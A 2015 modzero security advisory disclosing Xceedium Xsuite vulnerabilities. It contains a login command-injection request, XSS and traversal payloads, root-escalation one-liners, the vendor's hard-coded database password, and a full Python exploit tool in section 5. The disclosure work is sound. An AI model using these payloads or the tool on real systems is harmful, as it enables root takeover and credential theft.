@@ -1,0 +1,561 @@
+See also: http://www.modzero.ch/advisories/MZ-15-02-Xceedium-Xsuite.txt
+
+---------------------------------------------------------------------
+
+modzero Security Advisory:
+Multiple Vulnerabilities in Xceedium Xsuite [MZ-15-02]
+
+---------------------------------------------------------------------
+
+---------------------------------------------------------------------
+
+1. Timeline
+
+---------------------------------------------------------------------
+
+ * 2015-06-17: Vulnerabilities have been discovered
+ * 2015-06-19: Vendor notified via support@xceedium.com
+ * 2015-06-19: CVE IDs assigned
+ * 2015-06-26: Public reminder sent via Twitter
+ * 2015-06-26: Findings updated
+ * 2015-07-22: Release after Xceedium did not respond within
+               more than 15 business days
+
+---------------------------------------------------------------------
+
+2. Summary
+
+---------------------------------------------------------------------
+
+Vendor: Xceedium, Inc.
+
+Products known to be affected:
+
+ * Xsuite 2.3.0
+ * Xsuite 2.4.3.0
+ * Other products and versions may be affected as well.
+
+Severity: Overall High
+Remote exploitable: remote and local
+
+The  Xsuite system  controls  and audits  privileged  user access  to
+computers  in a  network  environment.  Several vulnerabilities  were
+identified in the solution. The vulnerabilities allow unauthenticated
+users to fully compromise an Xsuite host over the network.
+
+The  issues  described  below  are only  examples  for  vulnerability
+classes. The solution is systematically affected by similar issues.
+
+CVE-2015-4664 to CVE-2015-4669 was  assigned to these vulnerabilities
+and vulnerability classes.
+
+---------------------------------------------------------------------
+
+3. Details
+
+---------------------------------------------------------------------
+
+3.1   Command  injection   via  the   login  form   (Severity:  High,
+CVE-2015-4664)
+
+The  login form  is affected  by a  code injection  vulnerability via
+the  "id" POST  parameter, which  allows an  unauthenticated attacker
+to  inject  Linux commands.  These  commands  are executed  with  the
+privileges  of  the Linux  user  "www-data".  The injected  command's
+output is then sent back to the attacker.
+
+An example HTTP request and response is shown below.
+
+HTTP request:
+
+POST /login.php HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://XXX.XXX.XXX.XXX/
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+
+id=admin'|cat /etc/passwd||a%20%23|&pass=admin&authTypeOption=use_local&loginID=
+
+
+
+HTTP response:
+
+HTTP/1.1 200 OK
+Date: Wed, 17 Jun 2015 10:47:47 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Set-Cookie: PHPSESSID=6d5b0fbf8349caf10493f65e8f0b131b; path=/; secure; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PROXY_AUTH_FAILURE=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/
+Strict-Transport-Security: max-age=365246060
+Content-Length: 2096
+Keep-Alive: timeout=150, max=300
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+[...]
+
+
+3.2   Cross-Site    Scripting   Vulnerability    (Severity:   Medium,
+CVE-2015-4665)
+
+The  following   example  shows  a  reflected   cross-site  scripting
+vulnerability  that injects  JavaScript code  into a  user's session.
+Here, the HTTP  response contains a message, which seems  to be JSON.
+However, the content type is  "text/html". Thus, a web browser treats
+the server response as HTML code (fragment).
+
+HTTP request:
+
+GET /ajax_cmd.php?cmd=COMPLETGRAPHYRECORDING&fileName=<img%20src%3da%20onload%3dalert(1)> HTTP/1.1
+Host: XXX.XXX.XXX.XXX
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=c4f6547d9d889336a7f4a9a953cc3815
+Connection: keep-alive
+
+
+HTTP response:
+
+HTTP/1.1 200 OK
+Date: Thu, 18 Jun 2015 11:10:07 GMT
+Server: Apache
+X-Frame-Options: SAMEORIGIN
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Strict-Transport-Security: max-age=365246060
+Content-Length: 70
+Keep-Alive: timeout=150, max=300
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+["Unable to find decryption key for file <img src=a onload=alert(1)>"]
+
+
+3.3 Directory  traversal and  File Download  Vulnerability (Severity:
+Medium/High, CVE-2015-4666)
+
+Due to insufficient input validation the "read_sessionlog.php" script
+is  affected by  a  directory traversal  vulnerability, which  allows
+unauthenticated users to obtain any files that the user "www-data" is
+allowed to  access. The  script tries  to cut  the "../"  pattern for
+relative  directory  addressing,  but  fails  to  sanitize  specially
+crafted input. Hence, it is still possible to download files from the
+host by accessing the script as shown below:
+
+https://XXX.XXX.XXX.XXX/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd
+
+The   following   code   is   part    of   the   source   code   file
+/var/www/htdocs/uag/web/opm/read_sessionlog.php
+
+[...]
+$file_path= $_REQUEST["logFile"];
+[...]
+
+if (strpos($file_path, '/opt/rpath') !== 0) { $file_path = '/opt/rpath/' .$file_path; }
+
+if($startByte < 1)
+        $startByte=0;
+
+if (isset($file_path)) {   
+   // make sure users cannot hack via ../../
+   $file_path = preg_replace("/\.\.\//", "", $file_path);    
+   $file_path = stripslashes($file_path);
+   // if the file does not exist, display it
+   if (!is_file($file_path)) { 
+   echo 'File (' .$_REQUEST["logFile"]. ') does not exist.'; 
+   exit(0);        
+   }
+}  
+
+output_file($file_path, 'VT100LogA.txt', '', $startByte, $searchChar, $searchDir, $totalByte);
+[...]
+
+
+3.4  Privilege  escalation   via  "/sbin/spadmind"  (Severity:  High,
+CVE-2015-4664)
+
+The  "spadmind"   service  allows  local  users   to  escalate  their
+privileges  to  become  "root".   In  combination  with  the  command
+injection  vulnerability from  section  3.1, it  is  possible to  run
+arbitrary commands as "root" user via the network.
+
+The web interface  runs under the privileges of the  web server user.
+To execute  privileged commands,  the web interface  sends text-based
+messages  via a  socket  to the  "spadmind"  process. The  "spadmind"
+process has a  listening socket bound to localhost:2210  and reads in
+text lines, which are partially  used as parameter for system command
+execution. Since the "spadmind" process  does not validate the input,
+an  attacker  is able  to  inject  commands  that are  executed  with
+super-user privileges.
+
+File: /sbin/spadmind
+
+[...]
+    # socket
+    my $clsock = shift;
+    # command and number of lines to process
+    my $command  = <$clsock>;
+    my $numlines = <$clsock>;
+
+    chomp($command);
+    chomp($numlines);
+[...]
+    } elsif ($command eq 'expect') {
+        chomp($line = <$clsock>);
+        my $res = `expect $line`;
+        if ($res =~ /(STATUS=\w+)/) {
+            $resp = $1;
+        } else {
+            $resp = 'unknown';
+        }
+[...]
+
+In the quoted  code above, running the command  "expect" and allowing
+users to  specify parameters  is a vulnerability,  because parameters
+could be passed via option "-c" to invoke shell commands.
+
+$ echo -e "expect\n1\n-c garbage;id > /tmp/x23" | ncat --send-only 127.0.0.1 2210; sleep 1; cat
+/tmp/x23
+uid=0(root) gid=0(root)
+
+$ echo -e "timezone\n1\n;id > /tmp/x42" | ncat --send-only 127.0.0.1 2210; sleep 1; cat /tmp/x42 
+uid=0(root) gid=0(root)
+
+
+3.5 Hard-coded database credentials (Severity: Low, CVE-2015-4667)
+
+The  software uses  hard-coded credentials  at several  places, which
+makes it unfeasible to change database credentials regularly.
+
+$ grep -R n1b2dy .
+./uag/db/init/install-xio-uag-data.sql:SET PASSWORD FOR 'uaguser'@'localhost'=PASSWORD('n1b2dy');
+./uag/db/init/upgrade401SP2to402.pl:use constant LW_DBPASS   => "n1b2dy";
+./www/htdocs/uag/web/activeActiveCmd.php:            $res = mysql_connect("localhost", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect("localhost", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect("localhost", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/web/activeActiveCmd.php:    $res = mysql_connect("localhost", "uaguser", "n1b2dy");
+./www/htdocs/uag/web/activeActiveCmd.php:    $link = mysql_connect("localhost", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/web/activeActiveCmd.php:        $link = mysql_connect("localhost", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/web/ajax_cmd.php:    $link = mysql_connect("localhost", "uaguser" ,"n1b2dy");
+./www/htdocs/uag/cgi/external_log_sync.php:    $db_link_local = new mysqli("localhost", "uaguser",
+"n1b2dy", "uag");
+./www/htdocs/uag/config/db.php:$dbchoices            = array("mysql", "uaguser", "n1b2dy");
+./www/htdocs/uag/services/main/common/Configuration.php:    const K_DB_PASS_DEFAULT  = 'n1b2dy';
+./www/htdocs/uag/functions/eula_check.php:        $link = mysql_connect("localhost", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/functions/eula_check.php:        $link = mysql_connect("localhost", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/functions/db.php:        $dbchoices            = array("mysql", "uaguser",
+"n1b2dy");
+./www/htdocs/uag/functions/remove_disabled_cron.pl:                        'n1b2dy',
+
+$ grep -R n1b2dy sbin
+sbin/logwatch:use constant LW_DBPASS   => "n1b2dy";
+sbin/interrogate-vmware.pl:  use constant   DB_PASSWORD  => 'n1b2dy';
+Binary file sbin/xcd_sshproxy matches
+Binary file sbin/xcd_upd matches
+Binary file sbin/vlmon matches
+Binary file sbin/sessd matches
+Binary file sbin/gksfdm matches
+Binary file sbin/xcdmsubagent matches
+sbin/logload:my $dbh = DBI->connect("DBI:mysql:uag", "uaguser", "n1b2dy") or die("Can not connect to
+the database\n");
+sbin/make-auth-token.pl:  my $passwd         = 'n1b2dy';
+sbin/rotate_coredumps.pl:  my $passwd         = 'n1b2dy';
+Binary file sbin/loadcrl matches
+sbin/ad_upd:      $dbh = DBI->connect( 'DBI:mysql:uag', 'uaguser', 'n1b2dy', { autocommit => 0 } )
+sbin/ad_upd:      my $db = DBI->connect( 'DBI:mysql:uag', 'uaguser', 'n1b2dy', { autocommit => 0 } )
+sbin/ad_upd:      $dbh = DBI->connect_cached( 'DBI:mysql:uag', 'uaguser', 'n1b2dy', { autocommit => 0 }
+)
+sbin/rfscheck:use constant LW_DBPASS  => "n1b2dy";
+sbin/auth.pl:    'n1b2dy',
+sbin/apwd:  my $dbh = DBI->connect("DBI:mysql:uag", "uaguser", "n1b2dy") or return;
+sbin/update_crld:my($dbpass)="n1b2dy";
+sbin/update_crld:                            'n1b2dy',
+
+
+3.6.   No   password  for   MySQL   "root"   user  (Severity:   High,
+CVE-2015-4669)
+
+Local  users  can access  databases  on  the system  without  further
+restrictions, because the MySQL "root" user has no password set.
+
+$ python XceediumXsuitePoC.py --host  XXX.XXX.XXX.XXX --cmd 'echo "update user set active = 0,
+passwd=sha1(\"myknownpw\") where u_name = \"mytargetuser\";"| mysql -u root uag'
+
+
+3.7 Open redirect (Severity: Low, CVE-2015-4668)
+
+An attacker may craft a link to  an Xsuite host that looks valid, but
+tricks the user  and abuses an open redirect  vulnerability in Xsuite
+to redirect a user to a third  party web site, for example a web site
+with malware.
+
+https://XXX.XXX.XXX.XXX/openwin.php?redirurl=%68%74%74%70%3a%2f%2f%77%77%77%2e%6d%6f%64%7a%65%72%6f%2e%63%68
+
+File: /var/www/htdocs/uag/web/openwin.php
+
+<?
+$redirurl = $_GET['redirurl'];
+
+header('Location: ' .$redirurl);
+
+?>
+
+
+3.8 Possible issues not further investigated
+
+Passwords stored in  the database are unsalted  hashes, which reduces
+the attack complexity if an attacker  has access to the database. The
+setup under invesatigation partially used MD5 and SHA1 hashes.
+
+The web interface and scripts  create SQL statements by concatenating
+strings and user-supplied input without proper input validation. This
+may result in SQL injections.
+
+$ grep -i -R  where . | grep -E '\$_(POST|GET)'
+./web/filter/filter_sfa.php:    $query = "delete from socket_filter_mon where
+sfm_id='".$_GET['sfm_id']."'";
+./web/filter/filter_command_list.php:        $query = "select * from cmd_list where
+id='".$_POST["s_list"]."'";
+./web/filter/filter_command_list.php:        $query = "delete from cmd_list where
+id='".$_POST["s_list"]."'";
+./web/filter/filter_command_list.php:        $query = "delete from cmd_keywords where
+list_id='".$_POST["s_list"]."'";
+./web/filter/filter_command_list.php:                 "where command_filter =
+'".$_POST["s_list"]."'";
+./web/filter/filter_command_list.php:    $query = "select * from cmd_list where
+list_type='".$_POST['r_ltype']."' order by listname";
+./web/filter/filter_command_list.php:              where id='".$_POST['id']."'";
+./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
+'".$_POST['number_warnings']."' where name = 'number_of_warnings'";
+./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
+'".$_POST['blacklist_action']."' where name = 'intervention_action'";
+./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
+'".$_POST['blacklist_intervention_message']."' where name = 'blacklist_intervention_message'";
+./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
+'".$_POST['whitelist_intervention_message']."' where name = 'whitelist_intervention_message'";
+./web/filter/filter_command.php:    $query = "update intervention_configuration set value =
+'".$_POST['alert_email_message']."' where name = 'alert_email_message'";
+./web/socketFilterCmd.php:        $res = mysql_query("SELECT h_id FROM host where hostID=" .
+$_GET['h_id']);
+./web/socketFilterCmd.php:        $res = mysql_query("SELECT h_id FROM host where hostID=" .
+$_GET['h_id']);
+./web/socketFilterCmd.php:    $query = "delete from rdp_lock where id='".$_GET['rdp_id']."'";
+./web/socketFilterCmd.php:    $query = "select hostID from host where h_id =
+'".db_esc($_GET["device_name"])."'";
+./web/socketFilterCmd.php:              where sess_id='".$_GET['PHPSESSID']."' and
+./web/socketFilterCmd.php:              $query = 'SELECT seq FROM gkconnection WHERE sess_id = "' .$sessid.
+'" AND hostID = "' .$_GET['h_id']. '" AND pid IS NOT NULL';
+./web/socketFilterCmd.php:                        $query = 'SELECT seq FROM gkconnection WHERE sess_id = "'
+.$sessid. '" AND hostID = "' .$_GET['h_id']. '" AND pid IS NOT NULL';
+./web/socketFilterCmd.php:                     $query = 'SELECT seq FROM gkconnection WHERE sess_id = "'
+.$sessid. '" AND hostID = "' .$_GET['h_id']. '" AND pid IS NOT NULL';
+./web/ajax_cmd.php:    $query = "select * from session where sess_id='".$_GET['param']."'";
+./web/ajax_cmd.php:                        WHERE hostID = '".$_GET['hostID']."'";
+./web/ajax_cmd.php:    $query = 'SELECT u.userID FROM session AS s, user AS u WHERE s.u_name =
+u.u_name AND s.sess_id = "' .db_esc($_GET['sess_id']). '"';
+./web/dev/dev_ajax.php:    $update_query = "UPDATE kta_settings set value = '".$_GET[$name]."' where
+name = '".$name."'";
+./web/dev/dev_group_ajax.php:    if ($_POST['where'] == 'hosts' || $_POST['where'] == 'hosts_sel') {
+./web/dev/dev_group_ajax.php:        $where = $_POST['where'];
+./web/dev/dev_group_ajax.php:    if ($_POST['where'] == 'hosts' || $_POST['where'] == 'hosts_sel') {
+./web/dev/dev_group_ajax.php:        $where = $_POST['where'];
+./web/dev/dev_group_ajax.php:    if ($_POST['where'] == 'hosts' || $_POST['where'] == 'hosts_sel') {
+./web/dev/dev_group_ajax.php:        $where = $_POST['where'];
+./features/dev_sfa.php:    $query = "delete from socket_filter_mon where
+sfm_id='".$_GET['sfm_id']."'";
+./hconfig/functions/smartb.php:      $query = "delete from smartb_cfg_files where fileName =
+'".$_POST["filename"]."'";
+
+
+---------------------------------------------------------------------
+
+4. Impact
+
+---------------------------------------------------------------------
+
+The identified  vulnerabilities allows any user  to execute arbitrary
+commands as system  super-user ("root"). Since the system  is used to
+control other  devices (for  example, via RDP  and SSH),  an attacker
+would add malicous modification to the Java-based clients for RDP and
+SSH to exfiltrate access credentials for computers and to abuse these
+credentials in further steps.
+
+
+---------------------------------------------------------------------
+
+5. Proof of concept exploit 
+
+---------------------------------------------------------------------
+
+#!/usr/bin/python
+#
+# Proof of Concept Tool to Exploit Vulnerabilities in 
+# Xceedium Xsuite
+#
+# Author: modzero AG, Switzerland
+#
+
+import httplib2, urllib
+import re
+import base64
+from optparse import OptionParser
+
+url = ''
+
+def get_command_output(cmd):
+    marker = '~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!~~~~!!!!'
+    values = {
+        'id' : "admin'| echo " + marker +"; " + cmd + " ; echo -n " + marker + "||X #",
+        'pass' : 'foo',
+        'authTypeOption' : 'use_local',
+        'loginID' : '',
+        }
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        }
+    values = urllib.urlencode(values)
+    h = httplib2.Http(disable_ssl_certificate_validation=True)
+    resp, content = h.request(url, "POST", values, headers = headers)
+    offset1 = content.find(marker) + len(marker)
+    offset2 = content.rfind(marker, offset1 + 1)
+    try:
+        return base64.standard_b64decode(content[offset1:offset2])
+    except:
+        return content[offset1:offset2]
+
+
+def get_dir(retrieve_dir):
+    fname = re.sub(r'\/', '_', retrieve_dir) + ".tgz"
+    text_file = open(fname, "w")
+    text_file.write(get_command_output("tar -czf - " + retrieve_dir + " | base64"))
+    text_file.close()
+
+def get_file(retrieve_file):
+    fname = re.sub(r'\/', '_', retrieve_file)
+    data = get_command_output("cat " + retrieve_file + " | base64")
+    print data
+    text_file = open(fname, "w")
+    text_file.write(data)
+    text_file.close()
+
+def exec_cmd(cmd):
+    data = get_command_output(cmd + " | base64")
+    print data
+
+def exec_root(cmd):
+    data = get_command_output('echo -e "timezone\n1\n;' + cmd + ' > /tmp/.x" | ncat --send-only
+127.0.0.1 2210; sleep 1; cat /tmp/.x | base64')
+    print data
+
+def upload_file(fname, dst_file):
+    with open(fname, 'r') as content_file:
+        b64_content = base64.standard_b64encode(content_file.read())
+        get_command_output("echo " + b64_content + " | base64 -d > " + dst_file)
+
+def main():
+    global url
+    parser = OptionParser()
+    parser.add_option("--host", dest="host", help="The host to attack")
+    parser.add_option("--dir", dest="dir", help="The directory to retrieve")
+    parser.add_option("--file", dest="file", help="The file to retrieve")
+    parser.add_option("--cmd", dest="cmd", help="The command to execute")
+    parser.add_option("--root", dest="root", help="The command to execute with root privileges")
+    parser.add_option("--upload", dest="upload", help="A local file to upload")
+    parser.add_option("--dst", dest="dst_file", help="The destination file for uploaded content")
+    
+    (options, args) = parser.parse_args()
+    
+    if options.host:
+        url = 'https://%s/login.php' % (options.host)
+        
+    if options.dir:
+        get_dir(options.dir)
+    elif options.file:
+        get_file(options.file)
+    elif options.cmd:
+        exec_cmd(options.cmd)
+    elif options.root:
+        exec_root(options.root)
+    elif options.upload:
+        upload_file(options.upload, options.dst_file)
+        
+if __name__ == "__main__":
+    main()
+
+
+---------------------------------------------------------------------
+
+6. Workaround
+
+---------------------------------------------------------------------
+
+A workaround is not known.
+
+---------------------------------------------------------------------
+
+7. Fix
+
+---------------------------------------------------------------------
+
+It is not known to modzero, if a security fix is available.
+
+---------------------------------------------------------------------
+
+8. Credits
+
+---------------------------------------------------------------------
+
+ * Martin Schobert (martin@modzero.ch)
+
+---------------------------------------------------------------------
+
+9. About modzero
+
+---------------------------------------------------------------------
+
+The  independent  Swiss  company  modzero  AG  assists  clients  with
+security analysis  in the complex  areas of computer  technology. The
+focus  lies  on  highly  detailed  technical  analysis  of  concepts,
+software  and  hardware components  as  well  as the  development  of
+individual solutions.  Colleagues at  modzero AG work  exclusively in
+practical, highly  technical computer-security areas and  can draw on
+decades  of experience  in  various platforms,  system concepts,  and
+designs.
+
+https://www.modzero.ch
+
+contact@modzero.ch
+
+---------------------------------------------------------------------
+
+10. Disclaimer
+
+---------------------------------------------------------------------
+
+The information  in the advisory  is believed  to be accurate  at the
+time of publishing  based on currently available  information. Use of
+the information constitutes acceptance for use in an AS IS condition.
+There are no warranties with  regard to this information. Neither the
+author  nor  the publisher  accepts  any  liability for  any  direct,
+indirect, or  consequential loss  or damage arising  from use  of, or
+reliance on, this information.
